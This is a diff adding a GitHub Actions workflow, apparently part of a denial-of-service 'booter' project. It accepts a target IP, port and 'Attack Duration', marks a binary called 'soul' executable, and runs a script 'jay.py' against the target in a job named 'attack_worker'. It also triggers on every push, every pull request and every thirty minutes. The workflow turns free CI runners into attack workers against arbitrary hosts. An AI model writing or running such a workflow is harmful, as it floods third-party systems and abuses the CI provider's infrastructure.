@@ -1,0 +1,41 @@
+name: soul
+on:
+  push:
+  pull_request:
+  schedule:
+    - cron: '*/30 * * * *'
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: 'Target IP'
+        required: true
+        type: string
+      port:
+        description: 'Target Port'
+        required: true
+        type: string
+      time:
+        description: 'Attack Duration'
+        required: true
+        type: string
+
+jobs:
+  attack_worker:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v3
+
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.9'
+
+      - name: Install dependencies
+        run: pip install -r requirements.txt
+
+      - name: Make soul binary executable
+        run: chmod +x ./soul
+
+      - name: Run attack
+        run: python3 jay.py ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }}
